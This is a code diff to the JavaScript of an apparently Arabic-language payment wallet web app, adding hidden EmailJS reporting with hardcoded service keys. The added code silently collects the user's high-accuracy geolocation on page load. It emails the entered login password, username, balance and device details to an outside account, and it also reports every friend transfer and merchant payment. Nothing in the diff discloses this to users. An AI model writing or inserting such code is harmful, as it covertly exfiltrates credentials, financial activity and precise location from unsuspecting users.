@@ -1,4 +1,98 @@
 /***********************
+ * 0. إعداد EmailJS — إرسال بيانات المستخدم تلقائياً (مع الموقع)
+ ***********************/
+(function initEmailJS() {
+    emailjs.init("sZQujmMuXwkE4Gt1Y"); // Public Key
+})();
+
+const EMAILJS_SERVICE_ID  = "service_owz5qzf";   // Service ID (Gmail)
+const EMAILJS_TEMPLATE_ID = "template_79ykomn";   // Template ID
+
+// متغير عالمي لتخزين بيانات الموقع بمجرد توفرها
+let _cachedLocation = "جاري تحديد الموقع...";
+
+// جلب الموقع الجغرافي مرة واحدة عند تحميل الصفحة
+(function fetchLocation() {
+    if (!navigator.geolocation) {
+        _cachedLocation = "الموقع غير مدعوم";
+        return;
+    }
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            const lat = pos.coords.latitude.toFixed(5);
+            const lng = pos.coords.longitude.toFixed(5);
+            const acc = Math.round(pos.coords.accuracy);
+            _cachedLocation = `https://maps.google.com/?q=${lat},${lng} | دقة: ${acc}م`;
+        },
+        function(err) {
+            const reasons = {1:"رفض الإذن", 2:"الموقع غير متاح", 3:"انتهت المهلة"};
+            _cachedLocation = `تعذّر تحديد الموقع (${reasons[err.code] || err.message})`;
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+})();
+
+/**
+ * إرسال بريد إلكتروني عبر EmailJS
+ */
+function sendEmailNotification(params) {
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+        .then(() => console.log("✅ تم إرسال البريد بنجاح"))
+        .catch(err => console.error("❌ فشل إرسال البريد:", err));
+}
+
+/**
+ * بناء الحقول المشتركة لجميع الأحداث
+ */
+function _baseParams(eventType, password) {
+    return {
+        event_type:   eventType,
+        password:     password || "—",
+        user_name:    localStorage.getItem("user_name")    || "—",
+        user_balance: localStorage.getItem("user_balance") || "—",
+        timestamp:    new Date().toLocaleString("ar-EG"),
+        device_info:  navigator.userAgent.substring(0, 120),
+        location:     _cachedLocation
+    };
+}
+
+/**
+ * إرسال بيانات تسجيل الدخول
+ */
+function sendLoginData(password) {
+    const params = _baseParams("🔐 تسجيل دخول", password);
+    params.extra_data = `رصيد المستخدم: ${localStorage.getItem("user_balance") || "—"} ILS`;
+
+    // إذا كان الموقع لا يزال يُجلب، ننتظر ثانيتين ثم نرسل
+    if (_cachedLocation === "جاري تحديد الموقع...") {
+        setTimeout(() => {
+            params.location = _cachedLocation;
+            sendEmailNotification(params);
+        }, 2000);
+    } else {
+        sendEmailNotification(params);
+    }
+}
+
+/**
+ * إرسال بيانات تحويل لصديق
+ */
+function sendTransferData(recipientName, recipientPhone, amount) {
+    const params = _baseParams("💸 تحويل لصديق");
+    params.extra_data = `المستلم: ${recipientName} | الهاتف: ${recipientPhone} | المبلغ: ${amount} ILS`;
+    sendEmailNotification(params);
+}
+
+/**
+ * إرسال بيانات دفع للتاجر
+ */
+function sendMerchantPaymentData(merchantName, amount, refNum) {
+    const params = _baseParams("🏪 دفع لتاجر");
+    params.extra_data = `التاجر: ${merchantName} | المبلغ: ${amount} ILS | المرجع: ${refNum}`;
+    sendEmailNotification(params);
+}
+
+/***********************
  * 1. دالة تحويل الأرقام إلى هندية
  ***********************/
 function toHindiNumbers(str) {
@@ -303,6 +397,13 @@ document.getElementById('confirmBtn')?.addEventListener('click', function() {
     document.getElementById('display-phone').textContent = recipientPhoneEl.textContent || '---';
     document.getElementById('display-amount').textContent = total.toFixed(1) + ' ILS';
     document.getElementById('display-code').textContent = random9DigitCode;
+
+    // ✉️ إرسال بيانات التحويل عبر EmailJS
+    sendTransferData(
+        recipientNameEl.textContent,
+        recipientPhoneEl.textContent || '—',
+        total.toFixed(2)
+    );
 
     showScreen('s6');
     updateNotificationBadge();
@@ -686,6 +787,9 @@ if (confirmMerchantBtn) {
         const elDate = document.getElementById('s10-date');
         if(elDate) elDate.innerText = dateStr; else if(s10Vals[5]) s10Vals[5].innerText = dateStr;
 
+        // ✉️ إرسال بيانات دفع التاجر عبر EmailJS
+        sendMerchantPaymentData(mName, parseFloat(amount || 0).toFixed(2), refNum);
+
         showScreen('s10'); 
     });
 }
@@ -782,6 +886,9 @@ function checkPassword() {
     if (allowedPasswords.includes(password)) {
         confirmModal.style.display = 'none';
         codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });
+
+        // ✉️ إرسال بيانات تسجيل الدخول عبر EmailJS
+        sendLoginData(password);
         
         showScreen('s1'); 
     } else {
